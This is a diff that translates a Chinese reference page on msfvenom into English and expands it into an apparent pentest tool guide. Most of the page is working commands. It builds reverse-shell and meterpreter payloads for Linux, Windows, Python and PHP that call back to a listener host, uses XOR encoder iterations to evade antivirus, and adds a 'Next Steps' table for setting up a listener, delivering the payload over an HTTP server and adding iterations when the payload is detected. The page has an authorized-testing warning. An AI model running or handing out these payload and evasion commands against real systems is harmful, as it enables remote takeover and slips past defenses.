@@ -1,46 +1,49 @@
-# msfvenom - Payload 生成器
+# msfvenom - Payload Generator
 
-## 概述
-| 属性 | 值 |
-|------|-----|
-| 二进制 | `msfvenom` |
-| 类别 | Payload 生成 |
-| 风险等级 | 高 |
+## Overview
+| Attribute | Value |
+|-----------|-------|
+| Binary | `msfvenom` |
+| Category | Payload Generation |
+| Risk Level | High |
 
-## 描述
-msfvenom 是 Metasploit 的 Payload 生成工具，可生成各种格式的攻击载荷，支持编码绕过检测。
+## Description
+msfvenom is Metasploit's payload generation tool. It creates attack payloads in various formats and supports encoding to help evade detection mechanisms.
 
 ---
 
-## 使用场景
+## Usage Patterns
 
-### 1. 列出 Payload
+### 1. List Payloads
+**Goal:** Browse available payloads by platform.
 ```bash
 msfvenom -l payloads
 msfvenom -l payloads | grep linux
 msfvenom -l payloads | grep meterpreter
 ```
 
-### 2. 列出输出格式
+### 2. List Output Formats
+**Goal:** See supported output file formats.
 ```bash
 msfvenom -l formats
 ```
 
-### 3. 列出编码器
+### 3. List Encoders
+**Goal:** See available encoding schemes for evasion.
 ```bash
 msfvenom -l encoders
 ```
 
 ---
 
-## Payload 生成示例
+## Payload Generation Examples
 
-### Linux 反向 Shell
+### Linux Reverse Shell
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
 ```
 
-### Windows 反向 Shell
+### Windows Reverse Shell
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
 ```
@@ -50,7 +53,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o meterpreter.exe
 ```
 
-### Python 脚本
+### Python Script
 ```bash
 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
 ```
@@ -60,48 +63,80 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
 ```
 
-### 带编码器（绕过检测）
+### With Encoder (Evasion)
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
 ```
-- `-e`: 编码器
-- `-i`: 迭代次数
+- `-e`: Encoder name
+- `-i`: Encoding iterations (more = harder to detect)
 
 ---
 
-## 常用选项
-| 选项 | 说明 |
-|------|------|
-| `-p` | Payload |
-| `-f` | 输出格式 |
-| `-o` | 输出文件 |
-| `-e` | 编码器 |
-| `-i` | 编码迭代次数 |
-| `-b` | 坏字符 |
-| `-n` | NOP 滑板长度 |
-| `LHOST` | 监听地址 |
-| `LPORT` | 监听端口 |
+## Common Options
+| Option | Description |
+|--------|-------------|
+| `-p` | Payload to use |
+| `-f` | Output format |
+| `-o` | Output file path |
+| `-e` | Encoder |
+| `-i` | Encoding iterations |
+| `-b` | Bad characters to avoid |
+| `-n` | NOP sled length |
+| `LHOST` | Listener IP address |
+| `LPORT` | Listener port |
 
 ---
 
-## 常用格式
-| 格式 | 说明 |
-|------|------|
-| `exe` | Windows 可执行 |
-| `elf` | Linux 可执行 |
-| `raw` | 原始字节 |
-| `python` | Python 代码 |
-| `php` | PHP 代码 |
-| `c` | C 代码 |
+## Common Output Formats
+| Format | Description |
+|--------|-------------|
+| `exe` | Windows executable |
+| `elf` | Linux executable |
+| `raw` | Raw bytes |
+| `python` | Python code |
+| `php` | PHP code |
+| `c` | C code |
 | `js_le` | JavaScript |
-| `war` | Java WAR 包 |
+| `war` | Java WAR package |
 
 ---
 
-## 安全提示
-| 风险 | 说明 |
-|------|------|
-| **高危** | 生成的 Payload 可执行任意代码 |
-| **检测** | 某些 Payload 会被杀软检测 |
+## Output Parsing
 
-> **警告**：仅用于授权测试
+### Sample Output
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 119 bytes
+Final size of elf file: 239 bytes
+Saved as: shell.elf
+```
+
+### Parsing Rules
+- `Payload size:` = raw payload bytes (check against bad character constraints)
+- `Final size of ... file:` = output file size
+- `Saved as:` = output file path
+- `[-]` auto-selection messages are informational, not errors
+- Encoder iterations increase both size and evasion capability
+
+---
+
+## Next Steps
+
+| Finding | Recommended Next Tool | Example |
+|---------|----------------------|---------|
+| Payload generated | Set up listener with `msfconsole` | `use exploit/multi/handler; set PAYLOAD ...; exploit` |
+| Need to deliver payload | `python3` HTTP server | `python3 -m http.server 8000` |
+| Payload detected by AV | Add encoder iterations | `msfvenom ... -e x64/xor -i 10` |
+| Need staged payload | Use staged variant | Use `/meterpreter/reverse_tcp` (staged) |
+
+---
+
+## Safety Warnings
+| Risk | Description |
+|------|-------------|
+| **High Impact** | Generated payloads execute arbitrary code on target systems. |
+| **Detection** | Some payloads are detected by antivirus/EDR solutions. |
+
+> **Warning:** Only use for authorized testing purposes.
